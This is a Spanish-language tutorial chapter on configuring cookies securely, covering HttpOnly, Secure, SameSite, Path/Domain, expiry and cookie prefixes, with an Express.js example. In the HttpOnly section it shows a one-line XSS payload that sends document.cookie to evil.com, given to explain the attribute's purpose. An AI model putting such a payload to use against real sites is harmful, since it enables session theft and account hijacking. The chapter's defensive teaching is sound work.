# 06. Cookies Seguras

Las cookies son un vector de ataque común. Configurarlas correctamente es crítico para la seguridad.

---

## 1. Atributos de Seguridad

```http
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
```

---

## 2. HttpOnly

Previene acceso desde JavaScript.

```http
Set-Cookie: sessionId=abc123; HttpOnly
```

```javascript
// ❌ No se puede acceder
console.log(document.cookie); // No muestra sessionId

// Protege contra XSS que intenta robar cookies
<script>fetch('https://evil.com?cookie=' + document.cookie);</script>;
```

**Cuándo usar:** Siempre para cookies de sesión/autenticación.

---

## 3. Secure

Solo envía la cookie por HTTPS.

```http
Set-Cookie: sessionId=abc123; Secure
```

Sin `Secure`, la cookie se envía por HTTP (inseguro, puede ser interceptada).

**Cuándo usar:** Siempre en producción.

---

## 4. SameSite

Previene CSRF.

### `SameSite=Strict`

```http
Set-Cookie: sessionId=abc123; SameSite=Strict
```

La cookie NO se envía en peticiones cross-site (ni siquiera al hacer click en un link).

**Pros:** Máxima seguridad.  
**Contras:** Puede romper flujos legítimos (ej: login desde email).

### `SameSite=Lax` (Default en navegadores modernos)

```http
Set-Cookie: sessionId=abc123; SameSite=Lax
```

La cookie se envía en navegación top-level (GET), pero no en peticiones cross-site (POST, fetch).

**Cuándo usar:** Balance entre seguridad y usabilidad.

### `SameSite=None`

```http
Set-Cookie: sessionId=abc123; SameSite=None; Secure
```

La cookie se envía siempre. **Requiere `Secure`.**

**Cuándo usar:** Iframes cross-origin, widgets embebidos.

---

## 5. Path y Domain

```http
Set-Cookie: token=xyz; Path=/api; Domain=.example.com
```

- **`Path=/api`:** Solo se envía en rutas que empiecen con `/api`.
- **`Domain=.example.com`:** Se envía a todos los subdominios.

**Seguridad:** Usa el `Path` más restrictivo posible.

---

## 6. Expiración

```http
Set-Cookie: sessionId=abc123; Max-Age=3600
Set-Cookie: rememberMe=xyz; Expires=Wed, 21 Oct 2025 07:28:00 GMT
```

- **`Max-Age`:** Segundos hasta expiración.
- **`Expires`:** Fecha exacta.
- **Sin ambos:** Cookie de sesión (se borra al cerrar el navegador).

**Seguridad:** Usa sesiones cortas para datos sensibles.

---

## 7. Prefijos de Cookie

### `__Secure-`

```http
Set-Cookie: __Secure-sessionId=abc123; Secure
```

El navegador solo acepta la cookie si tiene `Secure`.

### `__Host-`

```http
Set-Cookie: __Host-sessionId=abc123; Secure; Path=/
```

Requiere `Secure`, `Path=/`, y NO puede tener `Domain`. Previene ataques de subdominios.

---

## 8. Ejemplo Completo

```javascript
// Backend (Express.js)
res.cookie("sessionId", sessionId, {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "strict",
    maxAge: 3600000, // 1 hora
    path: "/",
});
```

---

## 9. Leer Cookies en JavaScript

```javascript
// Solo cookies sin HttpOnly
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(";").shift();
}

const csrfToken = getCookie("csrf-token");
```

---

## 10. Conclusión

**Configuración segura por defecto:**

```http
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
```
